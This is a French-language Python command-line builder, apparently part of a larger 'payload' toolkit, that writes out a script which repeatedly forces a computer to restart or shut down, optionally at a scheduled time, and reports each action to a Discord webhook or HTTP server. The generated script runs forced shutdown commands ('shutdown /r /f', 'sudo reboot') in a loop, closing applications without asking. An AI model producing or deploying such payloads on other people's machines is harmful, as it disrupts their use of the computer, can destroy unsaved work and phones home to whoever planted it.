import os
from colorama import Fore, Style, init
import time
import random

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Restart de PC ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Délai avant redémarrage (en secondes)
    2. Message affiché avant redémarrage
    3. Redémarrage forcé (ferme les apps sans demander)
    4. Nombre de redémarrages
    5. Délai entre chaque redémarrage (en secondes)
    6. Heure planifiée (ex: 22:30)
    7. Action : redémarrage ou arrêt
    8. Afficher un compte à rebours
        
         
          {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    9. Envoi sur Discord
    10. Envoi sur serveur HTTP
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)

def restart_module():
    clear()
    print("=== Restart de PC Configuration ===\n\n")

    choix = {
        "Délai avant redémarrage": None,
        "Message avant redémarrage": None,
        "Redémarrage forcé": None,
        "Nombre de redémarrages": None,
        "Délai entre redémarrages": None,
        "Heure planifiée": None,
        "Action": None,
        "Afficher compte à rebours": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def delai_avant():
        clear()
        delai = input("Délai avant redémarrage (secondes, 'random' pour 1-60s) : ")
        try:
            if delai.lower() == "random":
                delai = random.randint(1, 60)
            else:
                delai = int(delai)
                if delai < 0:
                    print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                    time.sleep(1)
                    affichage()
                    return
            choix["Délai avant redémarrage"] = delai
            print(f"Délai défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def message_avant():
        clear()
        msg = input("Message à afficher avant redémarrage (laisser vide = aucun) : ")
        choix["Message avant redémarrage"] = msg if msg.strip() != "" else None
        print(f"Message défini : '{choix['Message avant redémarrage']}'")
        time.sleep(1)
        affichage()

    def restart_force():
        clear()
        reponse = input("Activer le redémarrage forcé ? (y/n) : ").lower()
        choix["Redémarrage forcé"] = reponse == 'y'
        print(f"Redémarrage forcé : {'activé' if choix['Redémarrage forcé'] else 'désactivé'}.")
        time.sleep(1)
        affichage()

    def nb_redemarrages():
        clear()
        nb = input("Nombre de redémarrages (ex: 1) : ")
        try:
            nb = int(nb)
            if nb < 1:
                print(Fore.RED + "Le nombre doit être au moins 1." + Style.RESET_ALL)
                time.sleep(1)
                affichage()
                return
            choix["Nombre de redémarrages"] = nb
            print(f"Nombre de redémarrages défini sur {nb}.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def delai_entre():
        clear()
        delai = input("Délai entre chaque redémarrage (secondes) : ")
        try:
            delai = int(delai)
            if delai < 0:
                print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                time.sleep(1)
                affichage()
                return
            choix["Délai entre redémarrages"] = delai
            print(f"Délai entre redémarrages défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def heure_planifiee():
        clear()
        heure = input("Heure planifiée (format HH:MM, ex: 22:30, laisser vide = immédiat) : ").strip()
        if heure == "":
            choix["Heure planifiée"] = None
            print("Aucune heure planifiée (exécution immédiate).")
        else:
            # Validation basique du format HH:MM
            parties = heure.split(":")
            valide = (
                len(parties) == 2
                and parties[0].isdigit()
                and parties[1].isdigit()
                and 0 <= int(parties[0]) <= 23
                and 0 <= int(parties[1]) <= 59
            )
            if valide:
                choix["Heure planifiée"] = heure
                print(f"Heure planifiée définie sur {heure}.")
            else:
                print(Fore.RED + "Format invalide. Utilisez HH:MM (ex: 22:30)." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def action():
        clear()
        print("Choisissez l'action :")
        print("  1. Redémarrage")
        print("  2. Arrêt")
        reponse = input("Votre choix (1 ou 2) : ").strip()
        if reponse == "1":
            choix["Action"] = "restart"
            print("Action définie sur : redémarrage.")
        elif reponse == "2":
            choix["Action"] = "shutdown"
            print("Action définie sur : arrêt.")
        else:
            print(Fore.RED + "Choix invalide." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def compte_rebours():
        clear()
        reponse = input("Afficher un compte à rebours dans le terminal ? (y/n) : ").lower()
        choix["Afficher compte à rebours"] = reponse == 'y'
        print(f"Compte à rebours : {'activé' if choix['Afficher compte à rebours'] else 'désactivé'}.")
        time.sleep(1)
        affichage()

    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook Discord : ")
        choix["Envoi sur Discord"] = webhook
        affichage()

    def envoi_http():
        clear()
        url = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = url
        affichage()

    # -----------------------------------------------
    # Liste des options (même ordre que le menu)
    # -----------------------------------------------
    options = [
        ("Délai avant redémarrage",  delai_avant),
        ("Message avant redémarrage", message_avant),
        ("Redémarrage forcé",        restart_force),
        ("Nombre de redémarrages",   nb_redemarrages),
        ("Délai entre redémarrages", delai_entre),
        ("Heure planifiée",          heure_planifiee),
        ("Action",                   action),
        ("Afficher compte à rebours", compte_rebours),
        ("Envoi sur Discord",        envoi_discord),
        ("Envoi sur serveur HTTP",   envoi_http),
    ]

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        # L'action est obligatoire
        if choix["Action"] is None:
            print(Fore.RED + "Erreur : vous devez définir l'action (option 7) : redémarrage ou arrêt." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        # Dossier de sortie
        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, "restart_payload.py")
        os.makedirs(payload_dir, exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write("import os\n")
            f.write("import time\n")
            f.write("import datetime\n")
            if choix["Heure planifiée"]:
                f.write("import datetime\n")
            if choix["Envoi sur Discord"] or choix["Envoi sur serveur HTTP"]:
                f.write("import requests\n")
            f.write("\n")

            # --- Variables de configuration ---
            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"DELAI_AVANT         = {choix['Délai avant redémarrage'] or 0}\n")
            f.write(f"MESSAGE             = {repr(choix['Message avant redémarrage'])}\n")
            f.write(f"FORCE               = {choix['Redémarrage forcé'] if choix['Redémarrage forcé'] is not None else False}\n")
            f.write(f"NB_REDEMARRAGES     = {choix['Nombre de redémarrages'] or 1}\n")
            f.write(f"DELAI_ENTRE         = {choix['Délai entre redémarrages'] or 0}\n")
            f.write(f"HEURE_PLANIFIEE     = {repr(choix['Heure planifiée'])}\n")
            f.write(f"ACTION              = {repr(choix['Action'])}\n")
            f.write(f"COMPTE_REBOURS      = {choix['Afficher compte à rebours'] if choix['Afficher compte à rebours'] is not None else False}\n")

            if choix["Envoi sur Discord"]:
                f.write(f"DISCORD_WEBHOOK     = {repr(choix['Envoi sur Discord'])}\n")
            else:
                f.write("DISCORD_WEBHOOK     = None\n")

            if choix["Envoi sur serveur HTTP"]:
                f.write(f"HTTP_URL            = {repr(choix['Envoi sur serveur HTTP'])}\n")
            else:
                f.write("HTTP_URL            = None\n")

            f.write("\n")

            # --- Logique principale ---
            f.write("# ============================================================\n")
            f.write("# Fonctions\n")
            f.write("# ============================================================\n\n")

            # Fonction compte à rebours
            f.write("def afficher_compte_rebours(secondes):\n")
            f.write('    """Affiche un compte à rebours dans le terminal."""\n')
            f.write("    for i in range(secondes, 0, -1):\n")
            f.write("        print(f\"  Exécution dans {i} seconde(s)...\", end=\"\\r\")\n")
            f.write("        time.sleep(1)\n")
            f.write("    print()\n\n")

            # Fonction attente heure planifiée
            f.write("def attendre_heure(heure_str):\n")
            f.write('    """Attend jusqu\'à l\'heure planifiée (format HH:MM)."""\n')
            f.write("    heure_cible = heure_str.split(':')\n")
            f.write("    h, m = int(heure_cible[0]), int(heure_cible[1])\n")
            f.write("    print(f\"En attente de l'heure planifiée : {heure_str}...\")\n")
            f.write("    while True:\n")
            f.write("        maintenant = datetime.datetime.now()\n")
            f.write("        if maintenant.hour == h and maintenant.minute == m:\n")
            f.write("            print(\"Heure atteinte, exécution en cours...\")\n")
            f.write("            break\n")
            f.write("        time.sleep(10)\n\n")

            # Fonction d'envoi
            f.write("def envoyer_rapport(action, index, horodatage):\n")
            f.write('    """Envoie un rapport sur Discord et/ou HTTP."""\n')
            f.write("    if DISCORD_WEBHOOK:\n")
            f.write("        message = (\n")
            f.write("            f\"**Action exécutée** : `{action}`\\n\"\n")
            f.write("            f\"Redémarrage n°{index} | {horodatage}\"\n")
            f.write("        )\n")
            f.write("        try:\n")
            f.write("            requests.post(DISCORD_WEBHOOK, json={\"content\": message})\n")
            f.write("            print(\"Rapport envoyé sur Discord.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi Discord : {e}\")\n\n")
            f.write("    if HTTP_URL:\n")
            f.write("        data = {\n")
            f.write("            \"action\": action,\n")
            f.write("            \"numero\": index,\n")
            f.write("            \"horodatage\": horodatage,\n")
            f.write("        }\n")
            f.write("        try:\n")
            f.write("            requests.post(HTTP_URL, json=data)\n")
            f.write("            print(\"Rapport envoyé sur le serveur HTTP.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi HTTP : {e}\")\n\n")

            # Fonction construire commande OS
            f.write("def construire_commande():\n")
            f.write('    """Construit la commande système selon l\'OS et les options."""\n')
            f.write("    if os.name == 'nt':  # Windows\n")
            f.write("        if ACTION == 'restart':\n")
            f.write("            cmd = 'shutdown /r /t 0'\n")
            f.write("            if FORCE:\n")
            f.write("                cmd += ' /f'\n")
            f.write("        else:\n")
            f.write("            cmd = 'shutdown /s /t 0'\n")
            f.write("            if FORCE:\n")
            f.write("                cmd += ' /f'\n")
            f.write("    else:  # Linux / macOS\n")
            f.write("        if ACTION == 'restart':\n")
            f.write("            cmd = 'sudo reboot'\n")
            f.write("        else:\n")
            f.write("            cmd = 'sudo shutdown -h now'\n")
            f.write("    return cmd\n\n")

            # Fonction principale
            f.write("# ============================================================\n")
            f.write("# Point d'entrée\n")
            f.write("# ============================================================\n\n")
            f.write("def lancer_restart():\n")

            f.write("    # Attente de l'heure planifiée si définie\n")
            f.write("    if HEURE_PLANIFIEE:\n")
            f.write("        attendre_heure(HEURE_PLANIFIEE)\n\n")

            f.write("    cmd = construire_commande()\n\n")

            f.write("    for i in range(1, NB_REDEMARRAGES + 1):\n")
            f.write("        print(f\"\\n--- Redémarrage {i}/{NB_REDEMARRAGES} ---\")\n\n")

            f.write("        # Affichage du message personnalisé\n")
            f.write("        if MESSAGE:\n")
            f.write("            print(f\"Message : {MESSAGE}\")\n\n")

            f.write("        # Compte à rebours avant exécution\n")
            f.write("        if COMPTE_REBOURS and DELAI_AVANT > 0:\n")
            f.write("            afficher_compte_rebours(DELAI_AVANT)\n")
            f.write("        elif DELAI_AVANT > 0:\n")
            f.write("            time.sleep(DELAI_AVANT)\n\n")

            f.write("        # Envoi du rapport avant l'action\n")
            f.write("        horodatage = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')\n")
            f.write("        envoyer_rapport(ACTION, i, horodatage)\n\n")

            f.write("        # Exécution de la commande\n")
            f.write("        print(f\"Exécution : {cmd}\")\n")
            f.write("        os.system(cmd)\n\n")

            f.write("        # Délai entre les redémarrages (sauf après le dernier)\n")
            f.write("        if i < NB_REDEMARRAGES:\n")
            f.write("            print(f\"Attente de {DELAI_ENTRE} secondes avant le prochain redémarrage...\")\n")
            f.write("            time.sleep(DELAI_ENTRE)\n\n")

            f.write("if __name__ == '__main__':\n")
            f.write("    lancer_restart()\n")

        print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle du module Restart de PC :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value is not None else Fore.RED
                print(f"  {option:30s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)


# Point d'entrée si lancé directement
if __name__ == "__main__":
    restart_module()